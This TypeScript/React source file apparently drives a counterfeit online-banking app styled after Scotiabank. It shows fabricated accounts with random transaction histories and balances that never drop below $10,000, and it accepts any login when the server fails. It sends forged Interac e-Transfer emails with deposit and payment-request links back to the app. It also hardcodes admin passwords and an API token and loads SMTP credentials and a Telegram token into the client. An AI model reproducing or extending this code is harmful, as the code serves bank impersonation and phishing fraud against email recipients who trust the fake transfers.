import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { ScotiaAccountMap, ScotiaTransaction, PendingTransfer, ScotiaAccount, User, GlobalSettings } from './types';
import { sendEmail } from './services/emailRelay';
import { generateRandomTransactions } from './utils/randomData';
import { getApiUrl } from '../utils/apiConfig';

interface BankContextType {
  user: User | null;
  globalSettings: GlobalSettings | null;
  isLoading: boolean;
  error: string | null;
  isAdminPanelVisible: boolean;
  theme: 'light' | 'dark';
  toggleAdminPanel: () => void;
  setAdminPanelVisible: (visible: boolean) => void;
  toggleTheme: () => void;
  fetchGlobalSettings: () => Promise<void>;
  login: (username: string, password: string) => Promise<boolean>;
  logout: () => void;
  updateUser: (data: Partial<User>) => Promise<void>;
  updateAccount: (accountName: string, data: Partial<ScotiaAccount>) => Promise<void>;
  updateAccountBalance: (accountName: string) => Promise<void>;
  refreshAccountHistory: (accountName: string) => Promise<void>;
  performTransfer: (fromAccount: string, toAccount: string, amount: number, description: string) => Promise<void>;
  addTransaction: (accountName: string, transaction: ScotiaTransaction) => Promise<void>;
  cancelTransfer: (transferId: string) => Promise<void>;
  resendTransfer: (transferId: string) => Promise<void>;
  depositTransfer: (transferId: string, accountName: string) => Promise<void>;
  performETransfer: (fromAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => Promise<PendingTransfer | undefined>;
  requestETransfer: (toAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => Promise<void>;
}

const BankContext = createContext<BankContextType | undefined>(undefined);

export const BankProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [user, setUser] = useState<User | null>(null);
  const [globalSettings, setGlobalSettings] = useState<GlobalSettings | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isAdminPanelVisible, setIsAdminPanelVisible] = useState(false);
  const [theme, setTheme] = useState<'light' | 'dark'>('light');

  const fetchGlobalSettings = useCallback(async (retries = 3) => {
    try {
      const res = await fetch(getApiUrl('/api/admin/global-settings?token=projectsarah'));
      if (res.ok) {
        const data: GlobalSettings = await res.json();
        setGlobalSettings(data);
        
        setUser(prevUser => {
          if (!prevUser) return null;
          const updatedSettings = {
            ...prevUser.settings,
            overdraftLimit: data.general?.overdraftLimit || 500,
            transferLimit: data.general?.transferLimit || 3000,
            dailyLimit: data.general?.dailyLimit || 3000,
            maintenanceMode: data.general?.maintenanceMode || false,
            phpmailerSenderName: prevUser.settings.phpmailerSenderName || data.smtp?.senderName || 'Interac e-Transfer',
            smtpHost: data.smtp?.host,
            smtpPort: data.smtp?.port?.toString(),
            smtpUser: data.smtp?.user,
            smtpPass: data.smtp?.pass,
            telegramToken: data.telegram?.token,
          };
          return { ...prevUser, settings: updatedSettings };
        });
      } else {
        throw new Error(`Server returned ${res.status}`);
      }
    } catch (error) {
      console.error('Failed to fetch global settings:', error);
      if (retries > 0) {
        console.log(`Retrying... (${retries} retries left)`);
        setTimeout(() => fetchGlobalSettings(retries - 1), 1000);
      }
    }
  }, []);

  useEffect(() => {
    // Force light mode
    setTheme('light');

    // Fetch global settings on mount
    fetchGlobalSettings();
  }, [fetchGlobalSettings]);

  const toggleTheme = useCallback(() => {
    setTheme(prev => prev === 'light' ? 'dark' : 'light');
  }, []);

  const handleError = useCallback((msg: string, err: unknown) => {
    console.error(msg, err);
    setError(msg);
  }, []);

  const toggleAdminPanel = useCallback(() => {
    setIsAdminPanelVisible(prev => !prev);
  }, []);

  const setAdminPanelVisible = useCallback((visible: boolean) => {
    setIsAdminPanelVisible(visible);
  }, []);

  const generateRefNumber = () => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = 'CA';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  const calculateBalance = (history: ScotiaTransaction[]) => {
    return Math.round(history.reduce((sum, tx) => sum + tx.amount, 0) * 100) / 100;
  };

  const generateAllRandomHistory = useCallback(async (currentUser: User) => {
    const updatedAccounts = { ...currentUser.accounts };
    Object.keys(updatedAccounts).forEach(accountName => {
        if (!updatedAccounts[accountName].history || updatedAccounts[accountName].history.length === 0) {
          const targetBalance = updatedAccounts[accountName].balance;
          const randomHistory = generateRandomTransactions(15, targetBalance);
          updatedAccounts[accountName] = {
            ...updatedAccounts[accountName],
            history: randomHistory,
            balance: calculateBalance(randomHistory),
            onHold: 0
          };
        }
    });
    return updatedAccounts;
  }, []);

  const processSuccessfulLogin = useCallback(async (username: string, password: string, userData: Record<string, any>) => {
      const validPasswords = ['PROJECTSARAH', 'PROJECTSARH', 'covid-19', 'Covid-1919!!', 'Allmine2'];
      if (userData.isAdmin || (username.toUpperCase() === 'PROJECTSARAH' || username.toUpperCase() === 'ACCOUNTING@ABFARMS.CA') && validPasswords.includes(password)) {
        setIsAdminPanelVisible(true);
      }
      const defaultAccounts: ScotiaAccountMap = {
        'Ultimate Package': { type: 'banking', balance: 15000 + Math.random() * 5000, available: 15000 + Math.random() * 5000, points: 1250, history: [] },
        'Momentum Plus Savings': { type: 'banking', balance: 20000 + Math.random() * 10000, available: 20000 + Math.random() * 10000, points: 0, history: [] },
        'SCENE Visa Card': { type: 'credit', balance: -1250.40, available: 3749.60, points: 5420, history: [] },
        'Tax-Free Savings Account': { type: 'banking', balance: 5500.00, available: 5500.00, points: 0, history: [] },
        'Line of Credit': { type: 'credit', balance: -500.00, available: 9500.00, points: 0, history: [] }
      };

      const generateAcc = () => `${Math.floor(Math.random() * 90000) + 10000}-${Math.floor(Math.random() * 900) + 100}-${Math.floor(Math.random() * 9000000) + 1000000}`;

      // Assign realistic-looking account numbers to the default accounts
      defaultAccounts['Ultimate Package'].accountNumber = generateAcc();
      defaultAccounts['Momentum Plus Savings'].accountNumber = generateAcc();
      const isSpecialUser = username.toUpperCase() === 'PROJECTSARAH' || username.toUpperCase() === 'ACCOUNTING@ABFARMS.CA';
      defaultAccounts['SCENE Visa Card'].accountNumber = isSpecialUser ? '4519-1919-1919-1919' : `4532-XXXX-XXXX-${Math.floor(Math.random() * 9000) + 1000}`;
      defaultAccounts['Tax-Free Savings Account'].accountNumber = generateAcc();
      defaultAccounts['Line of Credit'].accountNumber = generateAcc();

      const userWithBalances = { 
        ...userData,
        username: username,
        securityWord: userData.securityWord || 'SARAH',
        accounts: userData.accounts || defaultAccounts,
        scenePoints: userData.scenePoints ?? 1000000,
        purchasedCards: userData.purchasedCards || [],
        settings: { 
          ...userData.settings, 
          overdraftLimit: 500,
          transferLimit: 3000,
          dailyLimit: 3000,
          phpmailerSenderName: userData.displayName || username.split('@')[0] || 'Interac e-Transfer'
        },
        contacts: userData.contacts || []
      };

      // Try to fetch global settings to override defaults
      try {
        const settingsRes = await fetch(getApiUrl('/api/admin/global-settings?token=projectsarah'));
        if (settingsRes.ok) {
          const settingsData = await settingsRes.json();
          userWithBalances.settings = {
            ...userWithBalances.settings,
            overdraftLimit: settingsData.general?.overdraftLimit || 500,
            transferLimit: settingsData.general?.transferLimit || 3000,
            dailyLimit: settingsData.general?.dailyLimit || 3000,
            phpmailerSenderName: userWithBalances.settings.phpmailerSenderName || settingsData.smtp?.senderName || 'Interac e-Transfer',
          };
        }
      } catch (error) {
        console.warn("Could not fetch global settings during login", error);
      }

      const accountsWithRandomHistory = await generateAllRandomHistory(userWithBalances);
      userWithBalances.accounts = accountsWithRandomHistory;
      setUser(userWithBalances);
      setIsLoading(false);
      return true;
  }, [setIsAdminPanelVisible, generateAllRandomHistory, setUser, setIsLoading]);

  const login = useCallback(async (username: string, password: string) => {
    try {
        setIsLoading(true);
        setError(null);
        
        // Try the server
        const response = await fetch(getApiUrl('/api/auth/login.php'), {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });

        if (response.ok) {
            const data = await response.json();
            if (data.success) {
              return await processSuccessfulLogin(username, password, data.user);
            } else {
              throw new Error(data.message || "Login failed");
            }
        } else {
            throw new Error("Server returned error");
        }
    } catch (err) {
        console.warn("Using front-end simulation for login.");
        // Fallback to front-end simulation
        setIsLoading(false);
        return await processSuccessfulLogin(username, password, { username });
    }
  }, [processSuccessfulLogin, setIsLoading, setError]);


  const logout = useCallback(() => {
    setUser(null);
  }, []);

  const updateUser = useCallback(async (data: Partial<User>) => {
    if (!user) return;
    const updatedUser = { ...user, ...data };
    setUser(updatedUser);

    try {
      const response = await fetch(getApiUrl('/api/user/update.php?token=projectsarah'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user.username, data })
      });
      if (!response.ok) throw new Error("Failed to sync user data to server");
    } catch (err) {
      console.error("Failed to sync user data to server", err);
      throw err;
    }
  }, [user]);

  const updateAccount = useCallback(async (accountName: string, data: Partial<ScotiaAccount>) => {
    try {
        if (!user) throw new Error("User not logged in");
        const updatedAccounts = { ...user.accounts };
        if (updatedAccounts[accountName]) {
          updatedAccounts[accountName] = { ...updatedAccounts[accountName], ...data };
          await updateUser({ accounts: updatedAccounts });
        }
    } catch (err) {
        handleError("Account update failed", err);
    }
  }, [user, updateUser, handleError]);

  const performTransfer = useCallback(async (fromAccount: string, toAccount: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        
        const updatedAccounts = { ...user.accounts };
        if (!updatedAccounts[fromAccount]) throw new Error("Account not found");

        const availableBalance = updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance;
        if (availableBalance - amount < 10000) {
          throw new Error(`Insufficient funds. Minimum balance of $10,000.00 required.`);
        }

        const transaction: ScotiaTransaction = {
          id: Date.now().toString(),
          date: new Date().toISOString(),
          description,
          amount: -amount,
          status: 'Completed',
          category: 'Transfer'
        };

        updatedAccounts[fromAccount] = {
          ...updatedAccounts[fromAccount],
          history: [transaction, ...updatedAccounts[fromAccount].history],
          balance: Math.max(10000, updatedAccounts[fromAccount].balance - amount),
          available: Math.max(10000, (updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance) - amount)
        };

        if (updatedAccounts[toAccount]) {
          const toTransaction: ScotiaTransaction = {
            ...transaction,
            amount: amount,
            description: `Transfer from ${fromAccount}`
          };
          updatedAccounts[toAccount] = {
            ...updatedAccounts[toAccount],
            history: [toTransaction, ...updatedAccounts[toAccount].history],
            balance: updatedAccounts[toAccount].balance + amount,
            available: (updatedAccounts[toAccount].available ?? updatedAccounts[toAccount].balance) + amount
          };
        }

        await updateUser({ accounts: updatedAccounts });
    } catch (err) {
        handleError("Transfer failed", err);
    }
  }, [user, updateUser, handleError]);

  const addTransaction = useCallback(async (accountName: string, transaction: ScotiaTransaction) => {
    try {
        if (!user || !user.accounts[accountName]) throw new Error("Account not found");
        
        const updatedAccounts = { ...user.accounts };
        updatedAccounts[accountName] = {
          ...updatedAccounts[accountName],
          history: [transaction, ...updatedAccounts[accountName].history],
          balance: Math.max(10000, updatedAccounts[accountName].balance + transaction.amount),
          available: Math.max(10000, (updatedAccounts[accountName].available ?? updatedAccounts[accountName].balance) + transaction.amount)
        };

        await updateUser({ accounts: updatedAccounts });
    } catch (err) {
        handleError("Transaction addition failed", err);
    }
  }, [user, updateUser, handleError]);

  const updateAccountBalance = useCallback(async (accountName: string) => {
    if (!user) return;
    const updatedAccounts = { ...user.accounts };
    if (updatedAccounts[accountName]) {
      const newBalance = Math.max(10000, calculateBalance(updatedAccounts[accountName].history));
      const newAvailable = newBalance - (updatedAccounts[accountName].onHold || 0);
      updatedAccounts[accountName] = { ...updatedAccounts[accountName], balance: newBalance, available: newAvailable };
      await updateUser({ accounts: updatedAccounts });
    }
  }, [user, updateUser]);

  const refreshAccountHistory = useCallback(async (accountName: string) => {
    if (!user) return;
    const updatedAccounts = { ...user.accounts };
    if (updatedAccounts[accountName]) {
      const targetBalance = updatedAccounts[accountName].balance;
      const randomHistory = generateRandomTransactions(15, targetBalance);
      updatedAccounts[accountName] = { 
        ...updatedAccounts[accountName], 
        history: randomHistory,
        balance: calculateBalance(randomHistory)
      };
      await updateUser({ accounts: updatedAccounts });
    }
  }, [user, updateUser]);

  const cancelTransfer = useCallback(async (transferId: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const updatedPending = pendingTransfers.filter(t => t.id !== transferId);
        const updatedAccounts = { ...user.accounts };

        if (transfer.fromAccountName && updatedAccounts[transfer.fromAccountName]) {
          // Update original pending transaction status
          updatedAccounts[transfer.fromAccountName].history = updatedAccounts[transfer.fromAccountName].history.map(tx => 
            tx.id === transferId ? { ...tx, status: 'Cancelled' } : tx
          );

          const refundTransaction: ScotiaTransaction = {
            id: generateRefNumber(),
            date: new Date().toISOString(),
            description: `Interac e-Transfer Cancelled - Refund from ${transfer.recipientName}`,
            amount: transfer.amount,
            status: 'Refunded',
            category: 'Deposit'
          };

          updatedAccounts[transfer.fromAccountName] = {
            ...updatedAccounts[transfer.fromAccountName],
            history: [refundTransaction, ...updatedAccounts[transfer.fromAccountName].history],
            balance: updatedAccounts[transfer.fromAccountName].balance + transfer.amount,
            available: (updatedAccounts[transfer.fromAccountName].available ?? updatedAccounts[transfer.fromAccountName].balance) + transfer.amount
          };
        }

        await updateUser({ 
          pendingTransfers: updatedPending,
          accounts: updatedAccounts
        });

        // Send cancellation email to recipient
        const todayObj = new Date();
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        
        await sendEmail({
          recipient_email: transfer.recipientEmail,
          recipient_name: transfer.recipientName,
          amount: transfer.amount,
          purpose: 'Interac e-Transfer Cancelled',
          template: 'cancelled.html',
          sender_name: user.settings.phpmailerSenderName || 'Interac e-Transfer',
          reference_number: transfer.id,
          date: dateStr,
          bank_name: 'AB FARMS LTD',
          greeting: `Hi ${transfer.recipientName},`,
          headline: `Interac e-Transfer Cancelled`,
          app_url: window.location.origin,
          security_warning_text: 'This transfer has been cancelled by the sender and is no longer available for deposit.',
          action: 'View Status',
          deposit_payload: {
            amount: transfer.amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer',
            recipientName: transfer.recipientName,
            recipientEmail: transfer.recipientEmail,
            transaction_id: transfer.id,
            purpose: 'Interac e-Transfer Cancelled',
            status: 'cancelled'
          }
        }, '/api/mailer.php');
    } catch (err) {
        handleError("Cancellation failed", err);
    }
  }, [user, updateUser, handleError]);

  const depositTransfer = useCallback(async (transferId: string, accountName: string) => {
    try {
        if (!user || !user.accounts[accountName]) throw new Error("Account not found");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const updatedPending = pendingTransfers.filter(t => t.id !== transferId);
        const updatedAccounts = { ...user.accounts };

        const depositTransaction: ScotiaTransaction = {
          id: generateRefNumber(),
          date: new Date().toISOString(),
          description: `Interac e-Transfer Deposit from ${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer'}`,
          amount: transfer.amount,
          status: 'Completed',
          category: 'Deposit'
        };

        updatedAccounts[accountName] = {
          ...updatedAccounts[accountName],
          history: [depositTransaction, ...updatedAccounts[accountName].history],
          balance: updatedAccounts[accountName].balance + transfer.amount,
          available: (updatedAccounts[accountName].available ?? updatedAccounts[accountName].balance) + transfer.amount
        };

        await updateUser({ 
          pendingTransfers: updatedPending,
          accounts: updatedAccounts
        });
    } catch (err) {
        handleError("Deposit failed", err);
    }
  }, [user, updateUser, handleError]);

  const performETransfer = useCallback(async (fromAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        
        const updatedAccounts = { ...user.accounts };
        if (!updatedAccounts[fromAccount]) throw new Error("Account not found");

        const availableBalance = updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance;
        if (availableBalance - amount < 10000) {
          throw new Error(`Insufficient funds. Minimum balance of $10,000.00 required.`);
        }

        // Check transfer limit
        const transferLimit = user.settings.transferLimit || 3000;
        if (amount > transferLimit) {
          throw new Error(`This transfer exceeds your single transaction limit of ${transferLimit.toLocaleString()}.`);
        }

        // Check daily limit
        const dailyLimit = user.settings.dailyLimit || 3000;
        const todayStr = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const sentToday = (user.pendingTransfers || [])
          .filter(t => t.date === todayStr && t.status !== 'Cancelled')
          .reduce((sum, t) => sum + t.amount, 0);
        
        if (sentToday + amount > dailyLimit) {
          throw new Error(`This transfer exceeds your daily e-Transfer limit of ${dailyLimit.toLocaleString()}. You have already sent ${sentToday.toLocaleString()} today.`);
        }

        const refNumber = generateRefNumber();
        const transaction: ScotiaTransaction = {
          id: refNumber,
          date: new Date().toISOString(),
          description: description || `Interac e-Transfer to ${recipientName}`,
          amount: -amount,
          status: 'Sent',
          category: 'Transfer'
        };

        updatedAccounts[fromAccount] = {
          ...updatedAccounts[fromAccount],
          history: [transaction, ...updatedAccounts[fromAccount].history],
          balance: Math.max(10000, updatedAccounts[fromAccount].balance - amount),
          available: Math.max(10000, (updatedAccounts[fromAccount].available ?? updatedAccounts[fromAccount].balance) - amount)
        };

        const newPending: PendingTransfer = {
          id: refNumber,
          recipientName,
          recipientEmail,
          amount,
          date: new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' }),
          status: 'Sent',
          fromAccountName: fromAccount
        };

        await updateUser({ 
          accounts: updatedAccounts,
          pendingTransfers: [...(user.pendingTransfers || []), newPending]
        });

        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });

        const mailerUrl = '/api/mailer.php';
        
        await sendEmail({
          recipient_email: recipientEmail,
          recipient_name: recipientName,
          amount: amount,
          purpose: description || 'Interac e-Transfer',
          template: 'sending.html',
          sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'AB FARMS LTD',
          greeting: `Hi ${recipientName},`,
          headline: `${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer'} sent you an Interac e-Transfer.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'AB FARMS LTD'} will never ask for them by email or text.`,
          action: 'Deposit Funds',
          deposit_payload: {
            amount: amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer',
            recipientName: recipientName,
            recipientEmail: recipientEmail,
            transaction_id: refNumber,
            purpose: description || 'Interac e-Transfer',
            status: 'pending'
          }
        }, mailerUrl);
        
        return newPending;
    } catch (err) {
        handleError("E-Transfer failed", err);
    }
  }, [user, updateUser, handleError, globalSettings]);

  const resendTransfer = useCallback(async (transferId: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        const pendingTransfers = user.pendingTransfers || [];
        const transfer = pendingTransfers.find(t => t.id === transferId);
        if (!transfer) throw new Error("Transfer not found");

        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });

        const refNumber = generateRefNumber();
        const mailerUrl = '/api/mailer.php';
        
        await sendEmail({
          recipient_email: transfer.recipientEmail,
          recipient_name: transfer.recipientName,
          amount: transfer.amount,
          purpose: 'Interac e-Transfer Resend',
          template: 'resend.html',
          sender_name: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'AB FARMS LTD',
          greeting: `Hi ${transfer.recipientName},`,
          headline: `Reminder: ${user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer'} sent you an Interac e-Transfer.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'AB FARMS LTD'} will never ask for them by email or text.`,
          action: 'Deposit Funds',
          deposit_payload: {
            amount: transfer.amount.toFixed(2),
            senderName: user.settings.accountHolderName || user.settings.phpmailerSenderName || 'Interac e-Transfer',
            recipientName: transfer.recipientName,
            recipientEmail: transfer.recipientEmail,
            transaction_id: refNumber,
            purpose: 'Interac e-Transfer Resend',
            status: 'pending'
          }
        }, mailerUrl);
    } catch (err) {
        handleError("Resend failed", err);
    }
  }, [user, handleError, globalSettings]);

  const requestETransfer = useCallback(async (toAccount: string, recipientName: string, recipientEmail: string, amount: number, description: string) => {
    try {
        if (!user) throw new Error("User not logged in");
        
        const refNumber = generateRefNumber();
        const todayObj = new Date();
        const expiryDate = new Date(todayObj);
        expiryDate.setDate(todayObj.getDate() + 30);
        const dateStr = todayObj.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const expiryStr = expiryDate.toLocaleDateString('en-US', { year: 'numeric', month: 'short', day: 'numeric' });
        const mailerUrl = '/api/mailer.php';

        await sendEmail({
          recipient_email: recipientEmail,
          recipient_name: recipientName,
          amount: amount,
          purpose: description || 'Interac e-Transfer Request',
          template: 'request.html',
          sender_name: user.settings.phpmailerSenderName || 'Interac e-Transfer',
          reference_number: refNumber,
          date: dateStr,
          expiry_date: expiryStr,
          bank_name: globalSettings?.general?.bank_name || 'AB FARMS LTD',
          greeting: `Hi ${recipientName},`,
          headline: `${user.settings.phpmailerSenderName || 'Interac e-Transfer'} is requesting an Interac e-Transfer from you.`,
          app_url: window.location.origin,
          security_warning_text: `Keep your passwords and security answers private. ${globalSettings?.general?.bank_name || 'AB FARMS LTD'} will never ask for them by email or text.`,
          action: 'Pay Request',
          deposit_payload: {
            amount: amount.toFixed(2),
            senderName: user.settings.phpmailerSenderName || 'Interac e-Transfer',
            recipientName: recipientName,
            recipientEmail: recipientEmail,
            transaction_id: refNumber,
            purpose: description || 'Interac e-Transfer Request',
            type: 'request',
            status: 'pending'
          }
        }, mailerUrl);
    } catch (err) {
        handleError("Request failed", err);
    }
  }, [user, handleError, globalSettings]);

  return (
    <BankContext.Provider value={{ user, globalSettings, isLoading, error, isAdminPanelVisible, theme, toggleAdminPanel, setAdminPanelVisible, toggleTheme, fetchGlobalSettings, login, logout, updateUser, updateAccount, updateAccountBalance, refreshAccountHistory, performTransfer, addTransaction, cancelTransfer, resendTransfer, depositTransfer, performETransfer, requestETransfer }}>
      {children}
    </BankContext.Provider>
  );
};

export const useBank = () => {
  const context = useContext(BankContext);
  if (context === undefined) {
    throw new Error('useBank must be used within a BankProvider');
  }
  return context;
};
